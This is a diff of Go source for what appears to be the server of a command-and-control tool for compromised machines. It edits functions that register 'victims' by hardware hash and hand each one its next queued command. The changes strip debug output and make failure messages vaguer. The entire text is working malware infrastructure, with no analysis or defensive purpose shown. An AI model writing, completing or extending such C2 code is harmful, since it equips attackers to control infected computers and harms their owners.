@@ -96,17 +96,14 @@ func HandleIncomingCatData(incomingSuperCatString string) {
 func RegisterNewVictim(incomingJson string) (toReturn string){
 	clientTreeMutex.Lock()
 	defer clientTreeMutex.Unlock()
-	
-	println(incomingJson)
 
 	//see if the incoming data is even valid
 	var newVictimInfo VictimRegister
 	err := json.Unmarshal([]byte(incomingJson), &newVictimInfo)
 	if (err != nil || newVictimInfo.HardwareHash == ""){
-		println(err, ":",  newVictimInfo.HardwareHash)
 		var Response AssimilateResponse
 		Response.ResponseCode   = 1
-		Response.ResponseString = "Failure invalid"
+		Response.ResponseString = "Failure"
 		jsonResponse, _ :=json.Marshal(Response)
 		return string(jsonResponse)
 	}
@@ -116,7 +113,7 @@ func RegisterNewVictim(incomingJson string) (toReturn string){
 	if  (exists) {
 		var Response AssimilateResponse
 		Response.ResponseCode   = 1
-		Response.ResponseString = "Failure invalid2"
+		Response.ResponseString = "Failure"
 		jsonResponse, _ :=json.Marshal(Response)
 		return string(jsonResponse)
 	}
@@ -134,7 +131,53 @@ func RegisterNewVictim(incomingJson string) (toReturn string){
 }
 
 func HandleIncomingRequest(incomingJson string) (toreturn string){
-	return ""
+	clientTreeMutex.Lock()
+	defer clientTreeMutex.Unlock()
+
+	println("handle incoming request")
+
+	//see if the incoming data is even valid json
+	var jsonIncomingRequest IncomingVictimRequest
+	err := json.Unmarshal([]byte(incomingJson), &jsonIncomingRequest)
+	if (err != nil || jsonIncomingRequest.HardwareHash == ""){
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure1"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
+	//see if the tree even has this entry
+	clientData, exists := clientTree.Get(jsonIncomingRequest.HardwareHash);
+	if  (!exists) { //if it does not exist 
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure2"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
+	//see if there are even any commands to run for the hash if so return that to the client
+	if (len(clientData.(VictimInfo).Commands) > 0){
+		currentData := clientData.(VictimInfo)
+		var poppedCommand = currentData.Commands[0]
+		currentData.Commands = currentData.Commands[1:]
+
+		//have to replace what was taken here
+		clientTree.Put(currentData.VictimInfo.HardwareHash, currentData)
+
+		toSend, _ := json.Marshal(poppedCommand)
+		println(toSend)
+		return string(toSend)
+
+	}else {
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure3"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
 }
 
 func HandleIncomingData(incomingJson string) (toreturn string){
